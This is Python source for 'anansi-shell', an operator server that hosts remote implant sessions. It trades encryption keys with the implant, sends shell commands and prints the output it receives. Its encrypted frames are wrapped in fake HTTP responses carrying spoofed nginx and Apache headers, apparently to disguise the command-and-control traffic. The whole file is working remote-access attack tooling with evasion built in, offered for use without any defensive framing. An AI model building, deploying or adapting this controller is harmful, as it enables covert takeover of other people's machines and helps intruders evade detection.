"""Operator side: an SSH server hosting implant sessions."""

import argparse
import base64
import os
import random
import secrets
import socket
import sys

import paramiko
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.hkdf import HKDF


PROTO_VERSION = 1
AEAD = {1: AESGCM, 2: ChaCha20Poly1305}
MAX_FRAME = 2 << 20  # room for the base64 of a 1 MiB payload


def seal_frame(key, algo, plaintext):
    """Encrypt into header + nonce + ciphertext"""
    nonce = os.urandom(12)
    header = bytes((PROTO_VERSION, algo))
    # AEAD to encrypt and authenticate. header covered by the tag but stays readable.
    ciphertext = AEAD[algo](key).encrypt(nonce, base64.b64encode(plaintext), header)
    return header + nonce + ciphertext


def unseal_frame(key, body):
    """Decrypt frame body"""
    version, algo = body[0], body[1]
    if len(body) < 30 or version != PROTO_VERSION or algo not in AEAD:
        raise ValueError(f"unsupported frame header: version={version} algo={algo}")
    # Body layout: 2 header bytes, 12 nonce bytes, then ciphertext + 16 byte tag. 
    payload = AEAD[algo](key).decrypt(body[2:14], body[14:], body[:2])
    return base64.b64decode(payload, validate=True)


def read_exactly(channel, count):
    # recv() may return fewer bytes so keep looping; if empty then channel closed
    data = b""
    while len(data) < count:
        chunk = channel.recv(count - len(data))
        if not chunk:
            raise EOFError("channel closed mid-frame")
        data += chunk
    return data


# https-style wrapper
RESPONSE_SERVERS = ("nginx/1.24.0 (Ubuntu)", "Apache/2.4.58 (Unix)",
                    "lighttpd/1.4.71")
HEAD_LIMIT = 8192


def wrap_response(body):
    """Wrap a body in a HTTP response."""
    head = ("HTTP/1.1 200 OK\r\n"
            f"Server: {random.choice(RESPONSE_SERVERS)}\r\n"
            "Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n")
    return head.encode("ascii") + body


def recv_head(channel):
    # headers end at a blank line which leave no buffer state
    head = b""
    while not head.endswith(b"\r\n\r\n"):
        if len(head) > HEAD_LIMIT:
            raise ValueError("http head not terminated")
        byte = channel.recv(1)
        if not byte:
            raise EOFError("channel closed mid-head")
        head += byte
    return head


def unwrap_frame(channel):
    """Read one HTTP message, return its body."""
    head = recv_head(channel).decode("ascii", errors="replace")
    length = None
    for line in head.split("\r\n")[1:]:
        name, sep, value = line.partition(":")
        if sep and name.strip().lower() == "content-length":
            length = int(value.strip())
            break
    if length is None or not 0 <= length <= MAX_FRAME:
        raise ValueError(f"bad content-length: {length}")
    return read_exactly(channel, length)


def send_frame(channel, key, algo, plaintext):
    # sealed frame inside the http wrapper
    channel.sendall(wrap_response(seal_frame(key, algo, plaintext)))


def recv_frame(channel):
    return unwrap_frame(channel)


def send_raw(channel, blob):
    # public handshake values (unencrypted)
    channel.sendall(wrap_response(blob))


def handshake(channel):
    """X25519 exchange over the channel, returns the session key"""
    private = X25519PrivateKey.generate()
    offer = recv_frame(channel)
    # offer is client public key (32 bytes) + salt (16 bytes)
    if len(offer) != 48:
        raise ValueError(f"bad offer: {len(offer)} bytes")
    peer = X25519PublicKey.from_public_bytes(offer[:32])
    send_raw(channel, private.public_key().public_bytes_raw())
    return derive_key(private.exchange(peer), offer[32:])


def derive_key(shared, salt):
    # shared secret in, session key out.
    return HKDF(hashes.SHA256(), 32, salt, b"anansi-shell v1").derive(shared)


class ShellServer(paramiko.ServerInterface):
    """Accept user <shell>."""

    def __init__(self, password):
        self.password = password

    def check_auth_password(self, username, password):
        if username == "shell" and secrets.compare_digest(password, self.password):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED


def load_host_key(path):
    try:
        return paramiko.ECDSAKey.from_private_key_file(path)
    except (FileNotFoundError, paramiko.SSHException):
        key = paramiko.ECDSAKey.generate()
        key.write_private_key_file(path)
        return key


def handle_session(channel):
    """operator console: commands in, responses out"""
    channel.settimeout(60)  # must exceed the client's 30s command timeout
    key = handshake(channel)
    # send algorithm picked per session; frames carry their algo byte
    algo = random.choice(list(AEAD))
    cwd = "?"
    # request/response loop
    while True:
        print(f"anansi {cwd}> ", end="", flush=True)
        try:
            line = input()
        except EOFError:
            # operator stdin closed
            line = "exit"
        command = line.strip()
        if not command:
            continue
        try:
            if command in ("exit", "quit"):
                # let the client shut down, then drop the session here
                send_frame(channel, key, algo, b"exit")
                return
            send_frame(channel, key, algo, command.encode())
            # one reply = b"o" output frames, ended by one b"d" frame
            # carrying the cwd, a NUL, then the exit status
            while True:
                payload = unseal_frame(key, recv_frame(channel))
                if payload[:1] == b"d":
                    path, _, rc = payload[1:].partition(b"\x00")
                    cwd = path.decode(errors="replace")
                    # only failures speak; success keeps the console quiet
                    if rc not in (b"", b"0"):
                        print(f"[exit {rc.decode()}]", flush=True)
                    break
                # command output need not be valid UTF-8
                sys.stdout.buffer.write(payload[1:])
                sys.stdout.buffer.flush()
        except (OSError, EOFError):
            # channel died mid-session; InvalidTag is not caught on purpose,
            # if tampered then kill the session
            print("session closed by client", flush=True)
            return


def serve(bind, port, host_key, password):
    listener = socket.create_server((bind, port))
    print(f"listening on {bind}:{port}", flush=True)
    while True:
        sock, addr = listener.accept()
        transport = paramiko.Transport(sock)
        transport.add_server_key(host_key)
        try:
            transport.start_server(server=ShellServer(password))
            channel = transport.accept(timeout=5)
            if channel is not None:
                print(f"session from {addr[0]}:{addr[1]}", flush=True)
                handle_session(channel)
        except Exception as exc:
            print(f"connection failed: {exc!r}", file=sys.stderr, flush=True)
        finally:
            transport.close()


def serve_tcp(bind, port):
    # demo no ssh auth, the wrapper uses bare socket
    listener = socket.create_server((bind, port))
    print(f"listening on {bind}:{port}", flush=True)
    while True:
        sock, addr = listener.accept()
        print(f"session from {addr[0]}:{addr[1]}", flush=True)
        try:
            handle_session(sock)
        except Exception as exc:
            print(f"connection failed: {exc!r}", file=sys.stderr, flush=True)
        finally:
            sock.close()


def main():
    parser = argparse.ArgumentParser(description="anansi-shell operator server")
    parser.add_argument("--bind", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--transport", choices=("ssh", "tcp"), default="ssh",
                        help="demo no auth, wrapper on the wire")
    args = parser.parse_args()
    if args.transport == "tcp":
        serve_tcp(args.bind, args.port)
        return
    host_key = load_host_key("server_host_key")
    password = secrets.token_urlsafe(12)
    print(f"host key fingerprint: {host_key.fingerprint}", flush=True)
    print(f"session password: {password}", flush=True)
    serve(args.bind, args.port, host_key, password)


if __name__ == "__main__":
    main()
